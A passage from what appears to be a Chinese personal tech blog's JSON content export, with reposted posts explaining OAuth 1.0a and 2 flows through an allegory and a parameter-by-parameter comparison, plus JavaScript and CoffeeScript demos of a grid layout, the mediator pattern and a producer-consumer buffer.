后来发现有这个的网站：lookup-user-id，通过此业界良心，成功获取到user_id，摆平了上面的请求。 ###二、参考 更多功能可参考api文档 如果想了解Oauth授权，点此 ###三、再说两句图片分享的网站万万千，instagram却只有一个。我不是此产品的脑残粉，只是觉得社区氛围这种东西，可意会而不可言传，它是社交产品的灵魂。不是每个功能相近的产品都能营造的。 事实上，instagram有很多限制，或者大家称之“功能不完善”的地方。比如，在pc上浏览网站，居然不能发图片，不能看自己关注的人，或者有哪些粉丝。这都限制死了，何以称为社交？但换个角度来想，这样就“强迫”用户去用手机操作instagram，因为产品最想想表达的，就是用摄影去快速记录生活，而已。 不用拓展业务的噱头去损坏产品的思想表达，不刻意向老板汇报我们新增了多少用户量。 “你想做什么，你就会进入什么样的圈子”，这句话，不单单是对用户而言，每个创造者心中都应有这样的思考。 the end.litten 2014.3.3","comments":true,"categories":[{"name":"技术","slug":"技术","permalink":"http://ipcreator.me/categories/技术/"}],"tags":[{"name":"web","slug":"web","permalink":"http://ipcreator.me/tags/web/"},{"name":"经验","slug":"经验","permalink":"http://ipcreator.me/tags/经验/"},{"name":"产品","slug":"产品","permalink":"http://ipcreator.me/tags/产品/"}]},{"title":"转：\"兔子，胡萝卜与OAuth的故事\"","date":"2013-08-20T04:55:00.000Z","path":"2013/08/20/zh-oauth-rabbit/","text":"那些简单的故事，就别用复杂的方式传诵 ##【让我来讲几个故事吧】 从前，有只老兔子，在仓库里存了一万根胡萝卜，作为给小兔子的遗产。而后他就去周游世界了。小兔子有天想去把萝卜拿出来，却被仓库外的一只兔子拦住了。一问才知道，这是老兔子安排的仓库守卫。和所有故事中的守护者一样，他正直而古板，八字眉下面有着睡眠不足的熊猫眼，世人一般称他为兔门神。兔子想要拿到萝卜，就得说服兔门神呀，于是他走了上前… ##【兔子与OAuth1.0的故事】 兔子首先得证明自己是只兔子，不是狗熊也不是狼，于是他向兔门神出示了身份证 兔门神说：哦，你是只兔子。但你还得证明你是老兔子的兔崽子呀。兔子说我爸旅游去了，怎么证明呢？兔门神说，这样吧，我把你的身份证拍下来，发送给你爸，让他看下这是不是你。于是兔门神打开了微信…… 正在休假的老兔子看了下照片，回复说证件照好难看毁三观啊，但勉强认得出这货就是我儿子 兔门神确认这信息后，说，你老爸还是认你这个儿子的 兔子问，那我可以去拿胡萝卜了没？ 兔门神说，可以了，这样吧，我发你个通行证，以后拿这个来我就不用这么麻烦了。 ##【兔子与OAuth1.0a的故事】 这种貌似天衣无缝的形式，却被一只坏兔子看出了破绽。他注意到一个细节，在最后的一步，兔门神都是习惯性的把通行证交给了面前的兔子,而不管这只兔子是不是当初的那只。于是，坏兔子趁兔门神正在和老兔子聊微信的时候，一个劲站在了兔子前面，最后兔门神居然把通行证塞给了他！这怎么可以？于是在第一步和第六步又有了修改。 兔子出示身份证的同时，也出示了自己的私房照，说，门神大哥呀，后面你记得把通行证给照片上的帅哥！ …… …… …… …… 兔门神看了下面前的兔子，私房照上的明显P过嘛但勉强认得出是本人，于是才交出了通行证 ##【兔子与Oauth2.0的故事】 兔门神回家后，向他的老婆兔女神汇报了今天的工作，更安全的方案使他得意洋洋，没想到被兔女神骂了一顿。兔女神说，兔子证明自己还得带个身份证，你不知道在天朝办个身份证多麻烦吗？让小兔子跟老兔子去聊下微信就可以了干嘛要你插手？兔门神哑口无言，兔女神高贵冷艳的说我有四种方案，给你先说说最常用的一种吧。 兔子一开始就跟他老爸聊微信了。当然他得明确告诉老爸，他需要打开哪个仓库（因为老兔子有很多儿子，每个儿子去拿萝卜的仓库不一样，兔子要指定一下具体是哪个，问他可不可以） 老兔子回复说：“just do IT”… 兔子然后去拿胡萝卜，首先被兔女神拦住了。女神告诉他，你要给我四样东西：老兔子的回复，你的私房照，身份证，还要给我一个密码。兔子愣愣的想了个密码，把这四样东西交了过去 兔女神把这四种东西混在一起，用魔法变出了两件法宝：一封情书和一撮猴子毛…然后她解释说：拿着我的情书去找我老公，他就让你进仓库了；但是这情书会过期，是出于安全考虑啦，过期后你得召唤我再写一封，召唤出我的步骤就是吹一下猴子毛，像孙悟空那样你就别在意这些细节好伐？ 兔子拿着情书去找兔门神时，发现他由于被妻子分担了压力，明显睡眠好多了… ##【演员表】 兔子-消费者，也就是第三方应用老兔子-用户，也就是我们，记住，我们永远是第三方的亲爹仓库-Oauth提供者，这里有我们保存的资料，比如说新浪微博，qq空间，人人…兔门神-在前两个故事中，由授权服务器和资源服务器共同扮演，在最后的故事中，只由资源服务器扮演兔女神-授权服务器，只管授权，不管取资源 ##【重要道具】 身份证-签名，将一个http请求以及相应参数字符串化拍下的身份证照片-Request Token，服务器进行认证通行证-Access Token，获取资源的凭证私房照-重定向地址坏兔子(我把它当成道具而不是演员)-重定向地址劫持仓库的名称-appId,即对应具体哪个第三方just do it-Auth code，用户授权号第三个故事的身份证-client id 客户端帐号密码-client secret 客户端密码魔法-将client id，client secket，重定向地址，Auth code生成Access Token情书-Access Token，获取资源的凭证猴子毛-Refresh Token，用来在Access Token过期后将其刷新，刷新需带上client id和client secret ##【说书人说】 Oauth2.0比起Oauth1.0，没有了第一步的签名，将服务器分开为授权服务器与资源服务器。这是最大的两个特征。开放平台必须得做到对第三方友好，才有利于接入。像Oauth1.0签名的操作，就难倒了许多第三方。也许你知道了Oauth2.0接入步骤简化了些，但也知道其内部实现要更复杂，抛去安全方面的考虑，我认为这是正确的方向。因为，Oauth2.0在某种意义上说，向第三方做到了——“把悲伤留给自己，你的美丽让你带走”。","comments":true,"categories":[{"name":"技术","slug":"技术","permalink":"http://ipcreator.me/categories/技术/"}],"tags":[{"name":"web","slug":"web","permalink":"http://ipcreator.me/tags/web/"}]},{"title":"转：\"谈谈OAuth1,OAuth2异同\"","date":"2013-08-11T02:55:00.000Z","path":"2013/08/11/zh-brief-oauth/","text":"##一、写在前面在收集资料时，我查询和学习了许多介绍OAuth的文章，这些文章有好有坏，但大多是从个例出发。因此我想从官方文档出发，结合在stackoverflow上的一些讨论，一并整理一下。整理的内容分为OAuth1.0a和OAuth2两部分。 OAuth 1.0a：One Leg -&gt;Two Leg -&gt; Three LeggedOAuth 2:Two Leg -&gt;Three Legged (附：Refresh Token的方式) 这两种模式都是按箭头从左往右安全性递增，其实现也会相对复杂。关于官方的这种leg（腿？）的说法，在中文翻译中比较少有文章提及。下面分别来介绍OAuth的这5种授权流程。 ##二、OAuth1.0a2.1 OAuth 1.0a (One Leg) 应用给服务器发送一个签名请求，附带以下参数： oauth_token Empty String oauth_consumer_key oauth_timestamp oauth_nonce oauth_signature oauth_signature_method oauth_version Optional 服务验证并授予对资源的访问 应用程序利用请求的资源 2.2 OAuth 1.0a (Two Legs) 应用发送一个签名请求，以获取 Request Token： oauth_consumer_key oauth_timestamp oauth_nonce oauth_signature oauth_signature_method oauth_version Optional 服务器返回Request Token： oauth_token oauth_token_secret Additional Parameters / Arguments 发送签名请求，用Request Token换取Access Token oauth_token Request Token oauth_consumer_key oauth_nonce oauth_signature oauth_signature_method oauth_version 服务器返回Access Token和Token Secret 应用通过Access Token和Token Secret利用请求的资源 2.3 OAuth 1.0a (Three Legged) 应用发送一个签名请求，以获取 Request Token： oauth_consumer_key oauth_timestamp oauth_nonce oauth_signature oauth_signature_method oauth_version Optional 服务器返回Request Token： oauth_token oauth_token_secret oauth_callback_confirmed … Additional Parameters / Arguments 发送给用户授权的URL oauth_token 提示用户进行授权 用户进行授权 授权结束后返回应用，附带上： oauth_token oauth_verifier 发送签名请求，用Request Token换取Access Token oauth_token Request Token oauth_consumer_key oauth_nonce oauth_signature oauth_signature_method oauth_version oauth_verifier 服务器返回Access Token和Token Secret 应用通过Access Token和Token Secret利用请求的资源 ##三、OAuth2 3.1 OAuth 2 (Two Legged) 3.1.1 客户端凭据方式 应用发送请求到服务器： grant_type = client_credentials如果没有使用Authorization（Authorization: Basic Base64(client_id:client_secret)） 的header，必须附带参数为： client_id client_secret 服务器以Access Token回应 access_token expires_in token_type 3.1.2 隐式授予方式 应用发送请求到服务器： response_type = token redirect_uri This is a server-side Redirection URI hosted by the provider or yourself. scope state Optional client_id 用户可根据需要授权。 username password 服务器将响应包含access_token在内的redirect_uri 应用程序跳转至redirect_uri redirect_uri将响应一段脚本或HTML片段。响应的脚本或HTML片段包含参数access_token，还有您可能需要的任何其他参数。 3.1.3 资源所有者密码方式 应用向资源所有者请求凭证 username password 应用使用凭证，向服务器发送请求 grant_type = password username passwordurl看起来会像这样：grant_type=password&amp;username=my_username&amp;password=my_password如果你没有使用Authorization的header，必须附带上参数： client_id client_secreturl看起来会像是：grant_type=password&amp;username=my_username&amp;password=my_password&amp;client_id=random_string&amp;client_secret=random_secret 服务器返回Access Toke access_token expires_in token_type 3.2 OAuth 2 (Three Legged) 应用重定向用户到授权服务： client_id redirect_uri response_type state Optional; Unique identifier to protect against CSRF scope Optional; what data your application can access.url看起来会像是：oauth_service/login/oauth/authorize?client_id=3MVG9lKcPoNINVB&amp;redirect_uri=http://localhost/oauth/code_callback&amp;scope=user 用户登录服务器并确认授权给应用 服务器重定向用户到redirect_url ，附带参数： code state 应用拿到code，并换取Access Token client_id client_secret code redirect_uri Optional; grant_type = “authorization_code” 如果的client_id和client_secret是有效的，服务器将调用一个回调redirect_url，包含ACCESS_TOKEN access_token expires_in refresh_token 应用保存ACCESS_TOKEN，在随后的请求中使用。通常这个值被存储在session或或cookie，需要时作为授权请求的参数。 3.3 OAuth 2 (Refresh Token 刷新token) 在OAuth2中，Token会有过期时间，我们必须去refresh_token，使用其他一些先前获得的参数，生成一个新的token。这是一个容易得多的流程。 创建刷新令牌请求 grant_type = “refresh_token” scope Optional; Cannot have any new scopes not previously defined. refresh_token client_id client_secret 服务验证和响应以下参数： access_token issued_at ##四、stackoverflow上的一些问答 Q：OpenID和OAuth的区别是什么？A：OpenID是有关身份验证（即证明你是谁），OAuth有关授权（即授予访问权限），推荐博文：从用户的角度来看OpenID和OAuth Q：OAuth2与OAuth1不同的地方是？有人可以简单的解释的OAuth2和OAuth1之间的区别吗？ OAuth1现在已经过时，应实施的OAuth2？我没有看到许多实现的OAuth2，大多数仍在使用OAuth，这让我怀疑的OAuth2的准备使用。是吗？A：OAuth2能更好地支持不是基于浏览器的应用。对于不是基于浏览器的应用程序，这是对OAuth的主要挑战。例如，在OAuth1.0，桌面应用或手机应用必须引导用户打开浏览器所需的服务，与服务进行身份验证，并复制令牌从服务返回给应用程序。这里的主要批评是针对用户体验。使用OAuth2.0，可以用新的方式为用户的应用程序获得授权。OAuth2.0不再需要客户端应用程序拥有密钥。这让人回想起老的Twitter认证的API，它并不需要应用得到HMAC哈希令牌和请求字符串。使用OAuth2.0，应用程序可以通过HTTPS获得令牌。OAuth2.0的签名流程简单得多。没有更多的特殊解析，排序，或编码。OAuth2.0的访问令牌是“短命”的。通常情况下，OAuth1.0的访问令牌可以存储一年或一年以上（Twitter从来没有让他们到期）。 OAuth的2.0有刷新令牌的概念。虽然我不能完全肯定这是什么意思，我的猜测是，您的访问令牌可以是短暂存储的（即基于会话），而你可以刷新令牌。你使用刷新令牌获取新的访问令牌，而不是让用户重新授权您的应用程序。最后，OAuth2.0使得负责处理的OAuth请求的服务器和处理用户的授权服务器之间的角色有一个干净的分离。更多信息，在上述的文章中详述。 Q：OAuth2服务器群怎么使用state来防范CSRF？A：state只是一个随机的字符串，可以做这样的事情：$state = md5(uniqid(rand(), TRUE));在session中记录satate，以便稍后你能做验证。一些额外的资料：OAuth2威胁文件模型，特别CSRF保护","comments":true,"categories":[{"name":"技术","slug":"技术","permalink":"http://ipcreator.me/categories/技术/"}],"tags":[{"name":"web","slug":"web","permalink":"http://ipcreator.me/tags/web/"}]},{"title":"转：\"网易“聚合阅读”布局的实现\"","date":"2013-05-03T02:55:00.000Z","path":"2013/05/03/zh-my-news-reader-box/","text":"网易聚合阅读的出现的确让人惊艳了一下。流畅的交互,使碎片化的新闻资讯像报纸一样摊在眼前,这是信息大爆炸的时代产物。不管你能不能接受这种新阅读形式，事实上，每天越来越多的新闻层出不穷，还没被人看到就已成为了“旧闻”。回归报纸的版面设计，堆叠新闻模块，让用户告别一条接一条整齐的新闻链接，而是在一个版面上提供更多的信息，不失为一种尝试。 而抛去产品的层面，从前端方向来看，“聚合阅读”也有许多值得学习的地方。这几天研究了一下源码，谈谈它随机布局的实现，以及一些优化的措施。 ##demo 点击按钮可以改变布局： ##一.怎样定义格子对象 每个格子对象，都至少应该有这5个属性： left：距离左边界的位置 top：距离上边界的位置 width：格子宽度 height：格子高度 background：格子颜色 逐个去定义对象无疑是愚蠢的：12345678910111213141516171819function Block(o)&#123; return&#123; left: o.left, top: o.top, width: o.width, height: o.height, bg: o.bg &#125;&#125;var block1 = new Block(&#123; left: 0, top: 0, width: 50, height: 50, bg: \"#3f3\"&#125;);var block2 = ……var block37 = … 这样不仅不利于后期维护，而且构造格子的嵌套关系也相对麻烦。 网易的做法是使用“交替切割”的方式来做： 将大块先切成两列。 左列（红色部分）再切成三行，右列（褐，黄，蓝部分）也切成三行。 对形成的6个小块，再进行列的切割 整个做法就是“列-行-列-行-……”这样的交替切割。所以它的对象是这样设置的,其中random属性可以约定同级的cols或rows是否可以随机变换位置，width和height的值是规定一个父级块的分割比例。其设置的形式例如（例子与demo的设定无关）：12345678910111213141516171819202122232425262728293031323334window.tagConfig.pageLayout = &#123; top: 0, left: 0, width: 100, height: 100, random: !1, cols: [&#123; width: 30, rows: [&#123; height: 40, cols: [&#123; width: 30, rows:[&#123; height:100 &#125;] &#125;,&#123; width: 70, rows:[&#123; height:100 &#125;] &#125;] &#125;, &#123; height: 30 &#125;,&#123; height: 30 &#125;] &#125;,&#123; width: 70, rows:[&#123; height:100 &#125;] &#125;]&#125; ##二.递归调用切割函数12345678910111213141516171819function _getGrids(tag) &#123; /*domArr是拥有left,top,width,height,bg等属性的所有dom数组，_getGrids的最终目的就是生成这个数组*/ var domArr = [], _cutGrid(tag.pageLayout, function(tag) &#123; if (tag.rows || tag.cols) &#123; /*假如子级存在rows或者cols，则递归切割*/ _cutGrid(tag, arguments.callee); &#125; else &#123; /*子级不存在rows或者cols，不再进行切割，构造domArr*/ … domArr.push(xxx) … &#125; &#125; ); return domArr;&#125; ##三.切割函数 切割函数挺有意思的，下次想再用一篇文章来详细写一下，在这里仅贴出参考的源码。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889/*对象复制函数*/function _shadowClone(e) &#123; var t = &#123;&#125;; for (var n in e) e.hasOwnProperty(n) &amp;&amp; (t[n] = e[n]); return t;&#125;/*判断子块随机布局与否*/(function() &#123; function ranOrNot(e, t) &#123; var n = []; typeof t == \"undefined\" &amp;&amp; (t = e, e = 0); for (; e &lt; t; e++) n.push(e); return n &#125; /*随机布局*/ Array.prototype.randomEach = function(t) &#123; console.log(3); if (typeof t != \"function\") throw new TypeError; var n = this.length, r = ranOrNot(n); while (n) &#123; var i = Math.floor(Math.random() * n--); if (t(this[r[i]]) === !1) break; r[i] = r[n] &#125; &#125;, /*常规布局*/ Array.prototype.forEach || (Array.prototype.forEach = function(e) &#123; var t = this.length; if (typeof e != \"function\") throw new TypeError; var n = arguments[1]; for (var r = 0; r &lt; t; r++) r in this &amp;&amp; e.call(n, this[r], r, this) &#125;)&#125; )();/*切割函数*/function _cutGrid(tag, funcJudge) &#123; function a(a) &#123; function h(cutLength) &#123; /*复制子块对象并计算出子块top,left*/ var u, a = _shadowClone(cutLength); c++, u = c === l ? tag[cutType2.measure] - s: Math.floor(cutLength[cutType2.measure] * tag[cutType2.measure] / 100), a[cutType1.offset] = i + tag[cutType1.offset], a[cutType2.offset] = s + tag[cutType2.offset], a[cutType1.measure] = f, a[cutType2.measure] = u, a.colorPattern = tag.colorPattern, /*判断小块是否还需要分割*/ funcJudge(a), s += u &#125; var f, l = a[cutType2.name].length, c = 0; u++, f = u === cutLength ? tag[cutType1.measure] - i: Math.floor(a[cutType1.measure] * tag[cutType1.measure] / 100), a.random === !1 ? a[cutType2.name].forEach(h) : a[cutType2.name].randomEach(h), s = 0, i += f &#125; /*根据大块是否有rows属性，定义两种切割方式*/ var cutType1, cutType2; tag.rows ? (cutType1 = &#123; name: \"rows\", measure: \"height\", offset: \"top\" &#125;, cutType2 = &#123; name: \"cols\", measure: \"width\", offset: \"left\" &#125;) : (cutType1 = &#123; name: \"cols\", measure: \"width\", offset: \"left\" &#125;, cutType2 = &#123; name: \"rows\", measure: \"height\", offset: \"top\" &#125;); var i = 0, s = 0, cutLength = tag[cutType1.name].length, u = 0; /*是否随机布局*/ tag.random === !1 ? tag[cutType1.name].forEach(a) : tag[cutType1.name].randomEach(a)&#125; ##四.最后完成到这一步，我已不记得声明对象时出了多少次错误。各种尖括号，方括号，逗号和分号翩翩起舞时，你一定跟我一样很想念coffee的语法糖…","comments":true,"categories":[{"name":"技术","slug":"技术","permalink":"http://ipcreator.me/categories/技术/"}],"tags":[{"name":"js","slug":"js","permalink":"http://ipcreator.me/tags/js/"}]},{"title":"转：\"模式应用小分享——中介者模式(mediator)\"","date":"2013-01-02T04:36:00.000Z","path":"2013/01/02/zh-mediator-model/","text":"你需要一种设计模式，一定是哪里出问题了。这问题是指语言天生缺陷，不得不去寻找一种通用的解决方案。 程序设计最后的终点，就是要找到一种解决方案来解决问题。这句话正确无疑。但我又想起有个冷笑话，A对B说：我教你怎么去赢这盘象棋，B问怎样，A回答说：吃掉对方的“帅”就赢了啊。略去中间的过程，直接描述到结果，这其实是毫无意义的。而设计模式，又恰恰关乎中间解决问题的过程。现在关于模式的文章与书籍层出不穷，我自己也在看。但当我将理论回归应用的时候，一下子就懵了。这么多的模式，就像是一张又一张的棋谱教学，它告诉你要这么那么做，但你很少知道如何对症下药。也许到最后你东拼西凑总可以把“帅”吃掉，但遇到一个问题，如何选择下一步的模式见招拆招，已达到最有效率的胜利呢？ 因此我想写一些模式在应用方面的小分享。 ##中介者，你想到了什么？我们可以从实况足球谈起。一场足球比赛，进球加分，犯规处罚，控制时间，这些事件都由一个人来处决，我们叫他裁判，其实他就是比赛的中介者。裁判童鞋，代表了一种“控制集中化”的理念，这就是中介者模式的关键。试想一下，我们平时打球一般没有裁判，比分多少，是否犯规等都是由运动员我们自己来记录的，而我们往往都会有记错比分或者犯规纠纷的经验吧。这反应到程序上，就可以说是交互的复杂性带来的混乱。因此，我们在正规的比赛中必须要有裁判，运动员才可以把全部精力放到比赛上面去。于是中介者的引入，把运动员自己的复杂性变成了中介者的复杂性。 再深入一点，为什么有了裁判后，运动员的精力可以更集中呢？原因很简单，我们不需要记对方的分数了，犯规了也用不着自己去跟对方辩论。也就是说，两个队伍之间完全不用有比赛信息的直接交流了，取而代之的是把自己的信息转交给了裁判，让裁判去衡量两个队伍的信息，再进行加分，去判定是否犯规。这时我们可以说，这两个队伍对象解耦了，队伍对象之间的解耦，在客户端程序设计上的效果是很显著的，你很容易再引入一个队伍对象进行管理。试想一下如果有一场奇怪的球赛是有三个，四个队伍一起进行的，有了裁判这个中介者，运动员还是可以集中精力去比赛，否则他们就要去再多记比分了。 ##一个例子 或者点这里弹出看demo三国无双游戏中，有个经典的桥段，大家称为“拼刀”。当两个武将触发拼刀时，武将用武器相互抵着，玩家需要疯狂的按攻击键，一定时间内，谁按的次数多，谁就能赢得拼刀的胜利。其实这就是一个中介者模式的好例子。 其实不止是像这种“比赛”，想想像电力公司，将各家的电力进行集中管理，像给大家批阅试卷，给出成绩的老师，像一下子可以灭所有灯的寝室楼阿姨，像中国人民代表大会…额好吧，总之就是这么回事。 ##demo代码解析 coffeescript实现（50行） 首先我们设定Player对象，它有points和name属性，同时有一个prototype的属性play，使自己的分数加以，并将这信息通知中介者mediator：1234567Player = (name)-&gt; @points = 0 @name = namePlayer::play = -&gt; @points++ mediator.played() 然后我们设定scoreboard对象，这是一个得分板，在MVC模式当中，充当了V(view)，视图。它的使命就是update，将传递给它的数据score展示出来。因为裁判是mediator，它判定队伍得分后(得到score)，他必须通知电视台(对应scoreboard)，让他们把分数展示出来：123456789101112131415161718scoreboard = element: document.getElementById \"results\" update:(score)-&gt; msg = '' for key,value of score if score.hasOwnProperty key msg = msg+\"&lt;span&gt;&lt;strong&gt;#&#123;key&#125;&lt;/strong&gt;:#&#123;value&#125;&lt;/span&gt;\" @element.innerHTML = msg diff = score.Home - score.Guest if diff &gt; 15 alert \"Home Win!\" location.reload(); else if diff &lt;-15 alert \"Guest Win!\" location.reload(); else document.getElementById('barGuest').style.width = 150 + (diff*10) + 'px' 最后的片段就是中介者，mediator。它首先要决定开始比赛，也就是setup，新建了一个名称为Home，一个名称为Guest的Player model。当两个player得分时，mediator执行played，收集两方的分数，构造成score对象，并将这score对象交由scoreboard展示。keypress则是用于判断怎样才算得分：123456789101112131415161718192021mediator = players:&#123;&#125; setup:-&gt; players = @players players.home = new Player 'Home' players.guest = new Player 'Guest' played:-&gt; players = @players score = Home: players.home.points Guest:players.guest.points scoreboard.update score keypress:(e)-&gt; e = e|| window.event keycode = e.which if keycode is 102 mediator.players.home.play() return if keycode is 106 mediator.players.guest.play() return 最后执行，运行程序：12mediator.setup()window.onkeypress = mediator.keypress ##小分享心得中介者模式将控制集中化，colleague对象之间解耦，不必维护各自之间的网状通信，但mediator承受了所有colleague提供过来的信息，肯定会相对复杂。如何优化mediator也会成为一个课题。中介者模式有点像一对多的模型，一个mediator对应多个colleague，而如果现实模型是多对多的，中介者模型视复杂度来说不一定适合。","comments":true,"categories":[{"name":"技术","slug":"技术","permalink":"http://ipcreator.me/categories/技术/"}],"tags":[{"name":"coffeescript","slug":"coffeescript","permalink":"http://ipcreator.me/tags/coffeescript/"},{"name":"模式","slug":"模式","permalink":"http://ipcreator.me/tags/模式/"}]},{"title":"转：\"生产者-消费者模型的coffeescript实现\"","date":"2012-12-24T15:51:00.000Z","path":"2012/12/24/zh-coffee-pc/","text":"这两天一直在看coffeescript相关的东西，也帮一个朋友搞了个生产者-消费者模型的C语言实现。想到还没用coffeescript真正意义上写过程序，那就尝试做一下吧。 其实《CoffeeScript小书》是暑假实习时就买了，一直比较向往着函数式编程却拖延了很久没行动起来。小书只有几十页，本是github上一个开源的项目，我喜欢这种轻巧的文字。语法部分看下来，再看下类与继承，只花了半天的时间，而且心情非常愉悦，然后就可以开始我菜鸟的第一次试飞了。 生产者-消费者模型没什么好说的了，就是读写共享缓冲区，pv操作控制是否冲突。更多的就是冲着coffeescript来的。下面是一些凌乱但自认为有思考价值的记录，或许后续我会继续写一些coffeescript的学习笔记，再做深入的研究。 ##demo，可尝试点击“生产”“消费”按钮 ##litten如是想： 我一定要学一门，至少一门函数式风格编程语言，没有太深远的想法，就觉得它就是我的菜 这个程序是66行的coffeescript代码，最后编译后得到了122行的js代码，说明编程效率提升显著 括号，方括号，花括号，还有逗号有时候会多烦人，特别是使用过ExtJs的人，而coffeescript可以没有 用法简洁的jquery在coffeescript里面会更简洁 关于coffeescript的循环，它不推荐你使用for循环，而是使用“推导”，暴露在底层的循环只有while语法 事件绑定时，使用=&gt;可以免去js上下文切换this的麻烦 coffeescript的数组迭代方法非常的酷，三言两语说不清 javascript会是下一个JVM吗？ 站在产品的角度，我认为coffeescript这名字太长了-_-! ##附上源码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667N = 10class ProCon data: mutex:1 empty:N full:0 front:0 rear:0 buf: [] init:-&gt; i = 0 while i&lt;N newDom = $('&lt;div class=\"bufBox\"&gt;&lt;div class=\"bufCover\"&gt;'+i+'&lt;/div&gt;'+i+'&lt;/div&gt;') $('#buf').append(newDom) @data.buf.push 'e' i++ $('#produce').click =&gt; @producer() $('#consume').click =&gt; @consumer() p:(num)-&gt; return --num v:(num)-&gt; return ++num produceItem:-&gt; $('&lt;p class=\"desPro\"&gt;生产了产品&lt;/p&gt;').insertBefore $(\"#des p:first\") return 'm' consumeItem:-&gt; $('&lt;p class=\"desCon\"&gt;消费了产品&lt;/p&gt;').insertBefore $(\"#des p:first\") enterItem:(item) -&gt; @data.front = (@data.front+1)%N @data.buf[@data.front] = item; str = \"存入产品#&#123;@data.buf[@data.front]&#125;到缓冲区#&#123;@data.front&#125;\" $(\"&lt;p class='desPro'&gt;#&#123;str&#125;&lt;/p&gt;\").insertBefore $(\"#des p:first\") $($('.bufCover')[@data.front]).animate \"height\":\"50px\" removeItem:-&gt; @data.rear = (@data.rear + 1) % N; @data.buf[@data.rear] = 'e'; str = \"取出产品#&#123;@data.buf[@data.rear]&#125;从缓冲区#&#123;@data.rear&#125;\" $(\"&lt;p class='desCon'&gt;#&#123;str&#125;&lt;/p&gt;\").insertBefore $(\"#des p:first\") $($('.bufCover')[@data.rear]).animate \"height\":\"0px\" producer:-&gt; if @data.full==N $(\"&lt;p class='desSpe'&gt;缓冲区已全满&lt;/p&gt;\").insertBefore $(\"#des p:first\") return item = @produceItem() @data.empty = @p(@data.empty) @data.mutex = @p(@data.mutex) @enterItem(item) @data.mutex = @v(@data.mutex) @data.full = @v(@data.full) consumer:-&gt; if @data.empty==N $(\"&lt;p class='desSpe'&gt;缓冲区已空&lt;/p&gt;\").insertBefore $(\"#des p:first\") return @data.full = @p(@data.full) @data.mutex = @p(@data.mutex) @removeItem() @data.mutex = @v(@data.mutex) @data.empty = @v(@data.empty) @consumeItem() procon = new ProConprocon.init();","comments":true,"categories":[{"name":"技术","slug":"技术","permalink":"http://ipcreator.me/categories/技术/"}],"tags":[{"name":"js","slug":"js","permalink":"http://ipcreator.me/tags/js/"},{"name":"coffeescript","slug":"coffeescript","permalink":"http://ipcreator.me/tags/coffeescript/"}]}]